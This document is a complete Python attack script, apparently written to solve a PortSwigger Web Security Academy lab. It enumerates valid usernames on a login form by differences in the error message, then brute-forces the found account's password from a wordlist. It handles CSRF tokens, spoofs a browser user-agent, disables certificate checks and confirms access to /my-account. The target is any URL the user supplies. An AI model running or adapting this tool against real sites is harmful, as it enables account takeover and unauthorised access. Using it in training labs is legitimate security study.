#!/usr/bin/python3
"""
PortSwigger Lab Solver
Username enumeration + password brute force via login form
- Stage 1: enumerate valid username (response body differs on valid user)
- Stage 2: brute force password for found username (302 redirect = success)
"""
import sys
import argparse
import httpx
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Interface:
    def __init__(self):
        self.red    = '\033[91m'
        self.green  = '\033[92m'
        self.white  = '\033[37m'
        self.yellow = '\033[93m'
        self.bold   = '\033[1m'
        self.end    = '\033[0m'

    def header(self):
        print('\n    >> Username enumeration + password brute force')
        print('    >> by PortSwigger Academy\n')

    def info(self, message):
        print(f"[{self.white}*{self.end}] {message}")

    def warning(self, message):
        print(f"[{self.yellow}!{self.end}] {message}")

    def error(self, message):
        print(f"[{self.red}x{self.end}] {message}")

    def success(self, message):
        print(f"[{self.green}\u2713{self.end}] {self.bold}{message}{self.end}")


output    = Interface()
PROXY_URL = "http://127.0.0.1:8080"

BASE_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/146.0.0.0 Safari/537.36"
    ),
    "Accept": (
        "text/html,application/xhtml+xml,application/xml;q=0.9,"
        "image/avif,image/webp,image/apng,*/*;q=0.8,"
        "application/signed-exchange;v=b3;q=0.7"
    ),
    "Accept-Language":           "en-US,en;q=0.9",
    "Content-Type":              "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
    "Cache-Control":             "max-age=0",
}

# PortSwigger error strings for enumeration
INVALID_USER_MSG     = "Invalid username"
INVALID_PASSWORD_MSG = "Incorrect password"


# --- Helpers ---------------------------------------------------------------
def load_wordlist(path: str) -> list[str]:
    try:
        with open(path, "r", encoding="utf-8") as f:
            words = [line.strip() for line in f if line.strip()]
        output.info(f"Loaded {len(words):,} entries from {path}")
        return words
    except FileNotFoundError:
        output.error(f"Wordlist not found: {path}")
        sys.exit(1)


def get_csrf_token(client: httpx.Client, url: str) -> str | None:
    """
    Fetch a fresh CSRF token from GET /login.
    Returns None (not an error) if the login form has no CSRF field —
    some PortSwigger labs omit it entirely.
    """
    try:
        r = client.get(url + "/login")
    except httpx.RequestError as e:
        output.error(f"Failed to GET /login: {e}")
        return None

    soup = BeautifulSoup(r.text, "html.parser")

    # Try common CSRF field names
    for name in ("csrf", "_csrf", "csrftoken", "token"):
        inp = soup.find("input", attrs={"name": name})
        if inp and inp.get("value"):
            return inp["value"]

    # Debug: show all input fields so we can spot the right name
    all_inputs = soup.find_all("input")
    if all_inputs:
        output.warning(
            "No CSRF field found. Inputs present on /login: "
            + ", ".join(
                f"name={i.get('name','?')} type={i.get('type','?')}"
                for i in all_inputs
            )
        )
    else:
        output.warning("No <input> elements found on /login page at all.")

    # Return empty string instead of None — signals "no CSRF needed"
    return ""


def post_login(
    client: httpx.Client,
    url: str,
    username: str,
    password: str,
    csrf: str | None,
) -> httpx.Response | None:
    data: dict = {"username": username, "password": password}
    if csrf:                        # only include if the form needs it
        data["csrf"] = csrf

    headers = {**BASE_HEADERS, "Referer": f"{url}/login"}
    try:
        return client.post(
            url + "/login",
            data=data,
            headers=headers,
            follow_redirects=False,   # keep the raw 302 visible
        )
    except httpx.RequestError as e:
        output.warning(f"Request error for {username}:{password} — {e}")
        return None


# --- Stage 1: username enumeration -----------------------------------------
def enumerate_username(
    client: httpx.Client,
    url: str,
    usernames: list[str],
) -> str | None:
    output.info(f"Stage 1 — enumerating {len(usernames):,} usernames...")
    print()

    for i, username in enumerate(usernames, 1):
        csrf = get_csrf_token(client, url)
        if csrf is None:
            # None = network/parse failure (distinct from "" = no csrf field)
            output.error("Could not reach /login. Aborting.")
            return None

        r = post_login(client, url, username, "dummy_pass", csrf)
        if r is None:
            continue

        # 302 on first try = valid credentials (unlikely but handle it)
        if r.status_code == 302:
            output.success(f"[{i}/{len(usernames)}] Immediate login hit: {username}")
            print()
            return username

        # "Incorrect password" (not "Invalid username") = username exists
        if INVALID_USER_MSG not in r.text:
            output.success(f"[{i}/{len(usernames)}] Valid username found: {username}")
            print()
            return username

        print(f"  [{i}/{len(usernames)}] {username:<25} — invalid username", end="\r")

    print()
    return None


# --- Stage 2: password brute force -----------------------------------------
def brute_force_password(
    client: httpx.Client,
    url: str,
    username: str,
    passwords: list[str],
) -> str | None:
    output.info(
        f"Stage 2 — brute forcing {len(passwords):,} passwords for '{username}'..."
    )
    print()

    for i, password in enumerate(passwords, 1):
        csrf = get_csrf_token(client, url)
        if csrf is None:
            output.error("Could not reach /login. Aborting.")
            return None

        r = post_login(client, url, username, password, csrf)
        if r is None:
            continue

        # 302 redirect = successful login
        if r.status_code == 302:
            output.success(f"[{i}/{len(passwords)}] Valid password found: {password}")
            print()
            return password

        print(f"  [{i}/{len(passwords)}] {password:<30} — wrong", end="\r")

    print()
    return None


# --- Stage 3: verify login -------------------------------------------------
def login_and_verify(
    client: httpx.Client, url: str, username: str, password: str
) -> bool:
    csrf = get_csrf_token(client, url)
    if csrf is None:
        return False

    output.info(f"CSRF token : {csrf or '(none)'}")

    r = post_login(client, url, username, password, csrf)
    if r is None:
        return False

    if r.status_code == 302:
        location = r.headers.get("location", "/my-account")
        try:
            verify = client.get(
                url + location if location.startswith("/") else location,
                follow_redirects=True,
            )
            return "Log out" in verify.text or "/my-account" in str(verify.url)
        except httpx.RequestError:
            return True   # got the 302, credentials are valid

    return "Log out" in r.text


# --- CLI -------------------------------------------------------------------
def parse_args():
    parser = argparse.ArgumentParser(
        description="PortSwigger username enumeration + password brute force",
    )
    parser.add_argument("url",       help="Target URL (https://...)")
    parser.add_argument("usernames", help="Path to username wordlist")
    parser.add_argument("passwords", help="Path to password wordlist")
    parser.add_argument("--proxy",   action="store_true",
                        help=f"Route traffic via {PROXY_URL}")
    return parser.parse_args()


# --- Main ------------------------------------------------------------------
def main():
    output.header()
    args = parse_args()

    url = args.url.strip().rstrip('/')
    if not url.startswith(("http://", "https://")):
        output.error("URL must start with http:// or https://")
        sys.exit(1)

    usernames = load_wordlist(args.usernames)
    passwords = load_wordlist(args.passwords)

    proxy = PROXY_URL if args.proxy else None
    if proxy:
        output.warning(f"Routing via proxy {proxy}")

    with httpx.Client(
        proxy=proxy,
        verify=False,
        http2=False,
        follow_redirects=False,
        timeout=httpx.Timeout(15.0, connect=10.0),
    ) as client:

        # Stage 1: find valid username
        username = enumerate_username(client, url, usernames)
        if not username:
            output.error("No valid username found. Exiting.")
            sys.exit(1)

        # Stage 2: brute force password
        password = brute_force_password(client, url, username, passwords)
        if not password:
            output.error(f"No valid password found for '{username}'. Exiting.")
            sys.exit(1)

        # Stage 3: confirm login
        print()
        output.info(f"Verifying login as '{username}'...")
        if login_and_verify(client, url, username, password):
            output.success("Successfully logged in!")
            output.success(f"Username : {username}")
            output.success(f"Password : {password}")
            output.success(f"Access   : {url}/my-account")
        else:
            output.warning("302 received but verification inconclusive.")
            output.success(f"Username : {username}")
            output.success(f"Password : {password}")


if __name__ == "__main__":
    main()